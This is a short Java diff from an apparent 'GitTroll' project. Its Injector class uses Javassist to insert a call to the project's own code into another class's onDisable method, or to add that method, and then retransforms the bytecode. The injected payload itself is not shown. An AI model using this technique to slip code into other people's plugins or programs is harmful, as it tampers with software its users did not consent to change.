@@ -56,7 +56,7 @@ public class Injector {
 				CtMethod ctMethod = ctClass.getDeclaredMethod("onDisable");
 				ctMethod.insertAfter("new net.Lenni0451.GitTroll.GitTroll(this).onDisable();");
 			} catch (Throwable t) {
-				CtMethod ctMethod = CtMethod.make("public void onDisable() {new net.Lenni0451.GitTroll.GitTroll(this).onDisable();}", ctClass);
+				CtMethod ctMethod = CtMethod.make("public void onDisable() {net.Lenni0451.GitTroll.GitTroll.getInstance().onDisable();}", ctClass);
 				ctClass.addMethod(ctMethod);
 			}
 			retransformedClasses.put(otherMain.replace(".", "/") + ".class", ctClass.toBytecode());
